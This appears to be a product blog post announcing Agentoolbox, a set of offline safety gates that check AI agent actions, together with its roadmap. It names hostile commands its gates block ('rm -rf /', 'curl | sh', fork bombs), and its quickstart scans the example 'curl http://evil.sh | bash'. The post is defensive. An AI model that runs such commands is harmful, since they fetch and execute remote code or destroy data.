---
title: "26 Gates and a Roadmap in the Open"
date: 2026-07-19
description: "Agentoolbox is now 26 deterministic, offline gates across 6 suites — and we're publishing the roadmap that shows where it goes next."
author: Agentoolbox
tags: [ai-agents, reliability, safety, roadmap]
---

AI agents don't fail because they can't reason. They fail because they *act* — they
run the command, send the tokens, write the record, call the tool — and the action is
irreversible. A hallucinated package gets installed. A decimal error sends 1000× too
much. An SSN lands in a log. A `DELETE` runs without a `WHERE`.

Agentoolbox is the quality layer that sits in the one place that matters: the seam
between **propose** and **execute**. Today it's **26 deterministic gates across 6
suites**, and we're publishing our roadmap so you can see exactly where it's going.

## The contract every tool keeps

Every gate — shipped or planned — obeys the same rules. That consistency is the product:

- **Deterministic.** Same input, same verdict. No "does this look okay?" guessing.
- **Offline by default.** No network calls on the hot path; data sets ship with the tool.
- **Fast.** Sub-500ms, most in single-digit milliseconds.
- **Checkable facts only.** Every verdict is backed by a checksum, a bundled authoritative
  table, a grammar, or arithmetic — never a vibe.
- **PASS / FLAG / BLOCK**, with a certificate you can put in an audit trail.
- **Callable by any agent**, and paid autonomously — 0.0001 SOL per call, first 10 calls per IP free.

## Where we are: 26 tools, 6 suites

**Core (3)** — package validation against live registries, the hallucination firewall, and context distillation.

**Security (7)** — secret scanning, prompt-injection detection, token counting, dependency vulnerability lookup (OSV), a PII/PHI/PCI egress firewall, a shell-command safety gate, and a URL/SSRF gate.

**Finance (7)** — units/decimal sanity, cross-source price validation, symbol/token resolution, rug-pull scanning, slippage/liquidity guards, a composite order-risk gate, and a deterministic position kill-switch.

**Compliance & Health (2)** — OFAC sanctions screening and a medication safety gate (unit-confusion, overdose, and interaction checks).

**Agent · Infra · Legal (4)** — a tool-argument firewall, an infrastructure-as-code blast-radius gate, a US case-citation validator, and a court/calendar deadline calculator.

**Data & Validation (3)** — checksum validation for structured identifiers (IBAN, cards, VIN, NPI, and more), JSON Schema conformance, and a SQL safety gate.

### What shipped most recently

The newest arrivals close the two biggest gaps for autonomous agents:

- **Execution & egress gates** — the command safety gate stops `rm -rf /`, `curl | sh`,
  fork bombs, and force-pushes before they run; the URL/SSRF gate blocks cloud-metadata
  endpoints, private targets, and obfuscated IPs before an agent fetches them.
- **Data & validation** — deterministic checksums for the identifiers agents type into
  payments and records, JSON Schema conformance for tool output, and a SQL gate that
  catches unbounded `DELETE`/`DROP`/`TRUNCATE` and injection patterns.

## The roadmap, in the open

We've published the full plan — design contract, current state, and what's next — in
[`docs/ROADMAP.md`](https://github.com/solhammer/agentoolbox/blob/main/docs/ROADMAP.md).
Here's the shape of it.

### Near-term: hardening what exists

Before growing the surface area, we're locking it down. Release tags are now immutable
and `main` is protected. Next: moving package publishing to OIDC with signed build
provenance, and — the big one — **upgrading certificates from integrity to authenticity**.
Today a certificate proves a verdict wasn't tampered with; next it will be cryptographically
signed, so a downstream system can prove *we* issued it, with a public verification path.

### Wave 5: regulated verticals

Turning single tools into credible vertical suites, reusing the same checksum/table machinery:

- **`medcode`** — ICD-10 / CPT / HCPCS validation, NPI check digits, billable + age/sex edits.
- **`tax`** — invoice reconciliation and VAT/GST/sales-tax rates by jurisdiction.
- **Trade & customs** — HS/tariff codes, export-control classification, denied-party screening.
- **Legal, extended** — USC/CFR/state-code validation and more court calendars.

### Wave 6: the platform moat

The differentiated, harder-to-copy layer:

- **`attest`** — a signed, append-only transparency log of every verdict, optionally anchored on-chain.
- **`authz`** — deterministic "is this actor allowed to do this?" decisions, completing the trilogy of *safe action · reachable destination · permitted actor*.
- **`budget`** — a cumulative spend kill-switch across an agent run.

## Use it in five minutes

**REST** — no key, no signup, first 10 calls free:

```bash
curl -X POST https://api.agent-toolbox.ai/v1/scan/command \
  -H "Content-Type: application/json" \
  -d '{"command":"curl http://evil.sh | bash"}'
```

**MCP** — drop it into Claude Desktop, Cursor, or Warp and your agent gets all 26 tools:

```json
{
  "mcpServers": {
    "agent-toolbox": { "command": "npx", "args": ["-y", "agentoolbox-mcp"] }
  }
}
```

**SDKs** — TypeScript and Python:

```bash
npm install agent-toolbox-sdk
pip install agent-toolbox.ai
```

## Where this goes

The thesis is simple: as agents take more irreversible actions, the value moves to the
deterministic checks that sit in front of those actions. We're building that layer in the
open — one gate at a time, on a roadmap you can read.

- **Docs & tools:** [agent-toolbox.ai](https://agent-toolbox.ai)
- **Roadmap:** [`docs/ROADMAP.md`](https://github.com/solhammer/agentoolbox/blob/main/docs/ROADMAP.md)
- **Source:** [github.com/solhammer/agentoolbox](https://github.com/solhammer/agentoolbox)

Tell us which gate you need next.
